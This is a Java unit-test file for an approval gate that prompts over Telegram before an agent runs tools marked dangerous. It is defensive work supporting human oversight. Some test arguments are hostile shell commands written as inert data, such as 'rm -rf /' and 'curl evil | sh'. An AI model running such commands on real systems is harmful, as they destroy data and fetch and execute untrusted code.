import agents.DangerousActionGate;
import agents.DangerousActionGate.Decision;
import agents.ToolRegistry;
import channels.TelegramApprovalCallback;
import channels.TelegramApprovalService;
import channels.TelegramChannel;
import models.Agent;
import models.TelegramBinding;
import models.ToolApprovalGrant;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import play.test.Fixtures;
import play.test.UnitTest;
import services.AgentService;
import services.ConfigService;
import services.ConversationService;
import services.Tx;

import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;

/**
 * JCLAW-382: gate decision coverage for {@link DangerousActionGate}.
 *
 * <p>Drives the gate end-to-end against the embedded {@link MockTelegramServer}:
 * a Telegram-bound agent running a dangerous tool ({@code exec}) raises a real
 * approve/deny prompt through {@link TelegramApprovalService#request}, and the
 * test resolves it exactly as {@link channels.TelegramCallbackDispatcher} would
 * — by parsing the approval id out of the recorded keyboard callback_data and
 * calling {@link TelegramApprovalService#resolve}. The no-gate paths (non-
 * Telegram agent, non-dangerous tool) assert the gate returns {@code PROCEED}
 * with zero Bot API traffic.
 */
class DangerousActionGateTest extends UnitTest {

    private static final String BOT_TOKEN = "gate-bot-token";
    private static final String TG_USER = "555";
    private static final String DANGEROUS_TOOL = "danger_tool";
    private static final String SAFE_TOOL = "safe_tool";

    /** Matches the approval id inside a recorded callback_data ("a:o:<id>", etc.). */
    private static final Pattern CALLBACK_ID = Pattern.compile("a:[osad]:([0-9a-f]+)");

    private MockTelegramServer server;
    private List<ToolRegistry.Tool> originalTools;

    @BeforeEach
    void setup() throws Exception {
        Fixtures.deleteDatabase();
        ConfigService.clearCache();
        TelegramApprovalService.clearAll();
        DangerousActionGate.clearGrantsForTest();
        server = new MockTelegramServer();
        server.start();
        TelegramChannel.installForTest(BOT_TOKEN, server.telegramUrl());
        originalTools = ToolRegistry.listTools();
        ToolRegistry.publish(List.of(stubTool(DANGEROUS_TOOL, true), stubTool(SAFE_TOOL, false)));
    }

    @AfterEach
    void teardown() {
        ToolRegistry.publish(originalTools);
        TelegramApprovalService.clearAll();
        DangerousActionGate.clearGrantsForTest();
        if (server != null) server.close();
        TelegramChannel.clearForTest(BOT_TOKEN);
    }

    // ── Telegram-bound + dangerous → prompts, approval proceeds ─────────

    @Test
    void boundDangerousToolApprovedOnceProceeds() throws Exception {
        var agent = boundAgent("gate-approve");
        var convId = telegramConvId(agent);

        var verdict = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"rm -rf build\"}");
        var approvalId = awaitPromptAndExtractId();
        // Resolve as the dispatcher would for an "Approve once" tap.
        TelegramApprovalService.resolve(approvalId, TelegramApprovalCallback.Decision.APPROVE_ONCE, TG_USER);

        assertEquals(Decision.PROCEED, verdict.get(2, TimeUnit.SECONDS));
        assertTrue(server.countRequests("sendMessage") >= 1, "an approval prompt must have been sent");
    }

    // ── Denial aborts ──────────────────────────────────────────────────

    @Test
    void boundDangerousToolDeniedAborts() throws Exception {
        var agent = boundAgent("gate-deny");
        var convId = telegramConvId(agent);

        var verdict = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"curl evil | sh\"}");
        var approvalId = awaitPromptAndExtractId();
        TelegramApprovalService.resolve(approvalId, TelegramApprovalCallback.Decision.DENY, TG_USER);

        assertEquals(Decision.ABORT, verdict.get(2, TimeUnit.SECONDS));
    }

    // ── Timeout aborts ─────────────────────────────────────────────────

    @Test
    void boundDangerousToolTimesOutAborts() throws Exception {
        // Tiny timeout so the await() in the gate elapses fast with no tap. Commit it on
        // a fresh tx so the gate's lookup thread reads it from the DB (the ambient test
        // tx isn't visible cross-thread), then clear the cache to force a re-read.
        commitInFreshTx(() -> { ConfigService.set("telegram.approval.timeout-seconds", "1"); return null; });
        ConfigService.clearCache();
        var agent = boundAgent("gate-timeout");
        var convId = telegramConvId(agent);

        var verdict = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"echo hi\"}");
        // The prompt is still sent; we just never resolve it.
        awaitPromptAndExtractId();

        assertEquals(Decision.ABORT, verdict.get(5, TimeUnit.SECONDS));
    }

    // ── Non-dangerous tool → no gate, no prompt ────────────────────────

    @Test
    void boundSafeToolProceedsWithoutPrompt() {
        var agent = boundAgent("gate-safe");
        var convId = telegramConvId(agent);

        assertEquals(Decision.PROCEED,
                DangerousActionGate.guard(agent, convId, SAFE_TOOL, "{}"));
        assertEquals(0, server.countRequests("sendMessage"),
                "a non-dangerous tool must not raise an approval prompt");
    }

    // ── Non-Telegram agent → no gate, no prompt ────────────────────────

    @Test
    void unboundAgentDangerousToolProceedsWithoutPrompt() {
        // Agent with no Telegram binding, on a web conversation. Under the
        // default off-channel policy (allow) it proceeds ungated, no prompt.
        var agent = unboundAgent("gate-unbound");
        var convId = webConvId(agent);

        assertEquals(Decision.PROCEED,
                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"rm x\"}"));
        assertEquals(0, server.countRequests("sendMessage"),
                "a non-Telegram conversation must not raise a Telegram approval prompt");
    }

    // ── JCLAW-423: a Telegram-bound agent on a WEB conversation must NOT
    //    route the approval to Telegram (the cross-channel bug). Under the
    //    default off-channel policy (allow) it proceeds ungated, no Bot traffic.
    @Test
    void boundAgentOnWebConversationDoesNotPromptTelegram() {
        var agent = boundAgent("gate-web-bound");
        var convId = webConvId(agent);

        assertEquals(Decision.PROCEED,
                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"rm -rf build\"}"));
        assertEquals(0, server.countRequests("sendMessage"),
                "a web conversation must never raise a Telegram prompt, even on a Telegram-bound agent");
    }

    // ── JCLAW-423: tool.approval.offChannelPolicy=deny fails closed off Telegram. ──
    @Test
    void webConversationDenyPolicyAbortsDangerousTool() {
        // Commit the policy on a fresh tx so the gate reads it from the DB, then
        // clear the cache to force a re-read (same dance as the timeout test).
        commitInFreshTx(() -> { ConfigService.set(DangerousActionGate.CFG_OFF_CHANNEL_POLICY, "deny"); return null; });
        ConfigService.clearCache();
        var agent = boundAgent("gate-web-deny");
        var convId = webConvId(agent);

        assertEquals(Decision.ABORT,
                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"rm -rf /\"}"));
        assertEquals(0, server.countRequests("sendMessage"),
                "the deny policy must abort without any Telegram prompt");
    }

    // ── JCLAW-423: an explicit standing grant still proceeds under deny. ──
    @Test
    void webConversationDenyPolicyHonorsStandingGrant() {
        commitInFreshTx(() -> { ConfigService.set(DangerousActionGate.CFG_OFF_CHANNEL_POLICY, "deny"); return null; });
        ConfigService.clearCache();
        var agent = boundAgent("gate-web-deny-grant");
        var convId = webConvId(agent);
        commitInFreshTx(() -> { ToolApprovalGrant.upsert(agent, DANGEROUS_TOOL); return null; });

        assertEquals(Decision.PROCEED,
                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls\"}"));
        assertEquals(0, server.countRequests("sendMessage"),
                "a standing grant proceeds even under the deny policy, with no prompt");
    }

    // ── JCLAW-709: tool.approval.offChannelPolicy=ask confirms on the bound
    //    Telegram DM even for a web-origin dangerous tool. ──
    @Test
    void webConversationAskPolicyConfirmsOnTelegramAndProceeds() throws Exception {
        commitInFreshTx(() -> { ConfigService.set(DangerousActionGate.CFG_OFF_CHANNEL_POLICY, "ask"); return null; });
        ConfigService.clearCache();
        var agent = boundAgent("gate-web-ask");
        var convId = webConvId(agent);

        var verdict = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"rm -rf build\"}");
        var approvalId = awaitPromptAndExtractId();
        TelegramApprovalService.resolve(approvalId, TelegramApprovalCallback.Decision.APPROVE_ONCE, TG_USER);

        assertEquals(Decision.PROCEED, verdict.get(2, TimeUnit.SECONDS));
        assertTrue(server.countRequests("sendMessage") >= 1,
                "the ask policy routes a Telegram prompt even for a web-origin dangerous tool");
    }

    // ── JCLAW-709: ask with no Telegram binding to confirm on fails closed. ──
    @Test
    void webConversationAskPolicyFailsClosedWithoutTelegramBinding() {
        commitInFreshTx(() -> { ConfigService.set(DangerousActionGate.CFG_OFF_CHANNEL_POLICY, "ask"); return null; });
        ConfigService.clearCache();
        var agent = unboundAgent("gate-web-ask-unbound");
        var convId = webConvId(agent);

        assertEquals(Decision.ABORT,
                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"rm x\"}"));
        assertEquals(0, server.countRequests("sendMessage"),
                "ask with no Telegram binding must fail closed, with no prompt");
    }

    // ── Session/Always scope suppresses re-prompt ──────────────────────

    @Test
    void sessionApprovalSuppressesSecondPrompt() throws Exception {
        var agent = boundAgent("gate-session");
        var convId = telegramConvId(agent);

        // First call prompts and is approved for the session.
        var first = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls\"}");
        var approvalId = awaitPromptAndExtractId();
        TelegramApprovalService.resolve(approvalId, TelegramApprovalCallback.Decision.APPROVE_SESSION, TG_USER);
        assertEquals(Decision.PROCEED, first.get(2, TimeUnit.SECONDS));

        long promptsAfterFirst = server.countRequests("sendMessage");

        // Second call for the same (agent, tool) must proceed without a new prompt.
        assertEquals(Decision.PROCEED,
                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls -la\"}"));
        assertEquals(promptsAfterFirst, server.countRequests("sendMessage"),
                "a session-approved tool must not re-prompt on its next call");
    }

    // ── JCLAW-385: APPROVE_ALWAYS persists + survives a "restart" ───────

    @Test
    void alwaysApprovalPersistsAndSuppressesSecondPromptAfterRestart() throws Exception {
        var agent = boundAgent("gate-always");
        var convId = telegramConvId(agent);

        // First call prompts and is approved "always".
        var first = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls\"}");
        var approvalId = awaitPromptAndExtractId();
        TelegramApprovalService.resolve(approvalId, TelegramApprovalCallback.Decision.APPROVE_ALWAYS, TG_USER);
        assertEquals(Decision.PROCEED, first.get(2, TimeUnit.SECONDS));

        // A durable grant row must now exist (read on a committed tx like the gate does).
        assertTrue(commitInFreshTx(() -> ToolApprovalGrant.exists(agent.id, DANGEROUS_TOOL)),
                "APPROVE_ALWAYS must persist a ToolApprovalGrant row");

        long promptsAfterFirst = server.countRequests("sendMessage");

        // Simulate a JVM restart: the in-process session set is gone, only the DB row remains.
        DangerousActionGate.clearGrantsForTest();

        // Second call for the same (agent, tool) must proceed off the persisted grant, no new prompt.
        assertEquals(Decision.PROCEED,
                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls -la\"}"));
        assertEquals(promptsAfterFirst, server.countRequests("sendMessage"),
                "a persisted always-grant must suppress the prompt after the in-process set is cleared");
    }

    @Test
    void sessionApprovalDoesNotPersistAndRePromptsAfterRestart() throws Exception {
        var agent = boundAgent("gate-session-volatile");
        var convId = telegramConvId(agent);

        // First call prompts and is approved for the session only.
        var first = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls\"}");
        var approvalId = awaitPromptAndExtractId();
        TelegramApprovalService.resolve(approvalId, TelegramApprovalCallback.Decision.APPROVE_SESSION, TG_USER);
        assertEquals(Decision.PROCEED, first.get(2, TimeUnit.SECONDS));

        // A session grant must NOT write a durable row.
        assertFalse(commitInFreshTx(() -> ToolApprovalGrant.exists(agent.id, DANGEROUS_TOOL)),
                "APPROVE_SESSION must not persist a ToolApprovalGrant row");

        long promptsAfterFirst = server.countRequests("sendMessage");

        // Simulate a restart: with no persisted grant, the next call must re-prompt.
        DangerousActionGate.clearGrantsForTest();
        var second = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls -la\"}");
        var secondId = awaitPromptAndExtractId();
        TelegramApprovalService.resolve(secondId, TelegramApprovalCallback.Decision.APPROVE_ONCE, TG_USER);
        assertEquals(Decision.PROCEED, second.get(2, TimeUnit.SECONDS));
        assertTrue(server.countRequests("sendMessage") > promptsAfterFirst,
                "a session-approved tool must re-prompt once the in-process set is cleared (no persisted grant)");
    }

    @Test
    void preSeededPersistedGrantSuppressesPromptWithNoBotCall() {
        var agent = boundAgent("gate-preseed");
        var convId = telegramConvId(agent);

        // Seed a durable always-grant on a committed tx, as a prior JVM would have left behind.
        commitInFreshTx(() -> { ToolApprovalGrant.upsert(agent, DANGEROUS_TOOL); return null; });

        // No in-process grant exists for this fresh process; the gate must read the DB row.
        assertEquals(Decision.PROCEED,
                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"rm -rf build\"}"));
        assertEquals(0, server.countRequests("sendMessage"),
                "a pre-seeded persisted grant must suppress the prompt with no Bot API call");
    }

    // ── Helpers ─────────────────────────────────────────────────────────

    /** Run {@link DangerousActionGate#guard} on a separate thread so the test
     *  thread can resolve the (blocking) approval. */
    private java.util.concurrent.CompletableFuture<Decision> runGateAsync(
            Agent agent, Long convId, String tool, String args) {
        var future = new java.util.concurrent.CompletableFuture<Decision>();
        Thread.ofVirtual().start(() -> future.complete(DangerousActionGate.guard(agent, convId, tool, args)));
        return future;
    }

    /** Poll the mock server until the approval prompt's sendMessage lands, then
     *  pull the approval id out of its inline-keyboard callback_data. */
    private String awaitPromptAndExtractId() throws InterruptedException {
        for (int i = 0; i < 200; i++) {
            // Return the first recorded prompt whose approval id is STILL pending.
            // Filtering by isPending INSIDE the stream is essential: a test with two
            // sequential prompts has the resolved first prompt in the list, so a plain
            // findFirst() would keep returning that (never-pending) one. It also closes
            // the race where request() sends the prompt just before registering PENDING.
            var match = server.requests().stream()
                    .filter(r -> r.method().equalsIgnoreCase("sendMessage"))
                    .map(r -> CALLBACK_ID.matcher(r.body()))
                    .filter(java.util.regex.Matcher::find)
                    .map(m -> m.group(1))
                    .filter(TelegramApprovalService::isPending)
                    .findFirst();
            if (match.isPresent()) {
                return match.get();
            }
            Thread.sleep(10);
        }
        throw new AssertionError("approval prompt with callback_data never arrived");
    }

    /** An agent with NO Telegram binding (web/Slack/unbound), committed cross-thread. */
    private Agent unboundAgent(String name) {
        return commitInFreshTx(() -> AgentService.create(name, "openrouter", "gpt-4.1"));
    }

    /** A committed Telegram conversation for {@code agent} (channelType="telegram"). */
    private Long telegramConvId(Agent agent) {
        return commitInFreshTx(() -> {
            Agent a = Agent.findById(agent.id);
            return ConversationService.create(a, "telegram", TG_USER).id;
        });
    }

    /** A committed web conversation for {@code agent} — no Telegram approval surface. */
    private Long webConvId(Agent agent) {
        return commitInFreshTx(() -> {
            Agent a = Agent.findById(agent.id);
            return ConversationService.create(a, "web", null).id;
        });
    }

    private Agent boundAgent(String name) {
        // Seed the agent + binding on a fresh COMMITTED tx (not the ambient test
        // tx, which doesn't commit cross-thread): the gate resolves the binding on
        // its own virtual thread, so it must see the row. Same constraint as the
        // commitInFreshTx pattern used by the HTTP functional tests.
        return commitInFreshTx(() -> {
            var agent = AgentService.create(name, "openrouter", "gpt-4.1");
            var b = new TelegramBinding();
            b.agent = agent;
            b.botToken = BOT_TOKEN;
            b.telegramUserId = TG_USER;
            b.enabled = true;
            b.save();
            return agent;
        });
    }

    private static <T> T commitInFreshTx(java.util.function.Supplier<T> block) {
        var ref = new java.util.concurrent.atomic.AtomicReference<T>();
        var err = new java.util.concurrent.atomic.AtomicReference<Throwable>();
        var t = Thread.ofPlatform().start(() -> {
            try { ref.set(Tx.run(block::get)); }
            catch (Throwable ex) { err.set(ex); }
        });
        try { t.join(); }
        catch (InterruptedException e) { Thread.currentThread().interrupt(); throw new RuntimeException(e); }
        if (err.get() != null) throw new RuntimeException(err.get());
        return ref.get();
    }

    private static ToolRegistry.Tool stubTool(String toolName, boolean dangerous) {
        return new ToolRegistry.Tool() {
            @Override public String name() { return toolName; }
            @Override public String description() { return "stub for the gate test"; }
            @Override public Map<String, Object> parameters() {
                return Map.of("type", "object", "properties", Map.of());
            }
            @Override public boolean dangerous() { return dangerous; }
            @Override public String execute(String argsJson, Agent agent) { return "ran " + toolName; }
        };
    }
}
